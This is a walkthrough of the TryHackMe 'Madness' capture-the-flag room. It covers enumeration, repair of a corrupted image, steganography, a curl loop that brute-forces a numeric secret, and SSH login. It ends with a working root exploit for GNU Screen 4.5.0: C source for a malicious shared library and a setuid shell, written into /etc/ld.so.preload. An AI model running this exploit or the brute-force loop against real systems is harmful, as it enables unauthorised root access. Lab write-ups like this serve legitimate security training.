🧠 TryHackMe: Madness Walkthrough

(Writeup by Sujal Wasnik)

📌 Overview

This room focuses on:

Steganography
Enumeration
Encoding/Decoding
Privilege Escalation (SUID exploit)
🔍 Initial Enumeration
Nmap Scan
nmap -sC -sV <TARGET_IP>
Result
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd

👉 Web server is the main entry point.

🌐 Web Enumeration

Access the website:

http://<TARGET_IP>

You will see the default Apache page.

Key Observation
<!-- They will never find me -->

👉 Hidden clue present.

📁 Directory Enumeration
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
Result
/index.php (200)
🖼️ Image Analysis (Steganography)

Download image:

wget http://<TARGET_IP>/thm.jpg
Problem

Image does not open → corrupted.

🔧 Fixing the Image

Rebuild image:

python3 - << 'EOF'
data = open("thm.jpg","rb").read()
start = data.find(b'\xff\xdb')
rebuilt = b'\xff\xd8' + data[start:]
open("fixed.jpg","wb").write(rebuilt)
EOF

Open:

eog fixed.jpg
🧠 Hidden Clue Found

From image:

/th1s_1s_h1dd3n
🔐 Hidden Directory

Access:

http://<TARGET_IP>/th1s_1s_h1dd3n/

Page asks for a secret (0–99).

💣 Brute Force Secret
for i in {0..99}; do 
  res=$(curl -s "http://<TARGET_IP>/th1s_1s_h1dd3n/?secret=$i")
  echo "$res" | grep -q "wrong" || echo "[+] FOUND: $i"
done
Output
[+] FOUND: <SECRET_NUMBER>
🔑 Extracted Key

After correct input:

***************

👉 This is used as a steganography password

🧩 Extract Hidden Data
steghide extract -sf fixed.jpg

Enter password:

***************
📄 Hidden File
cat hidden.txt
Output
Here's a username:
******
🔐 Decode Username

ROT13 decode:

echo ****** | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Result
******
🔑 Finding Password

From image binary pattern → decode → get password:

***************
🔐 SSH Access
ssh <USERNAME>@<TARGET_IP>

Password:

***************
🏁 User Flag
cat user.txt
THM{********************************}
🚀 Privilege Escalation
Check SUID
find / -perm -4000 2>/dev/null
Interesting Binary
/bin/screen-4.5.0

👉 Known vulnerability.

💣 Exploit (Screen SUID)
Create Payload
cat > /tmp/libhax.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void dropshell(){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
cat > /tmp/rootshell.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>

int main(){
    setuid(0);
    setgid(0);
    execl("/bin/bash","bash","-p",NULL);
}
EOF
Compile
gcc -fPIC -shared -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
chmod 777 /tmp/rootshell
Exploit
cd /etc
umask 000
/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

Fix file:

printf '/tmp/libhax.so\n' > /etc/ld.so.preload

Trigger:

/bin/screen-4.5.0 -ls
💀 Root Shell
/tmp/rootshell
🏁 Root Flag
cat /root/root.txt
THM{********************************}
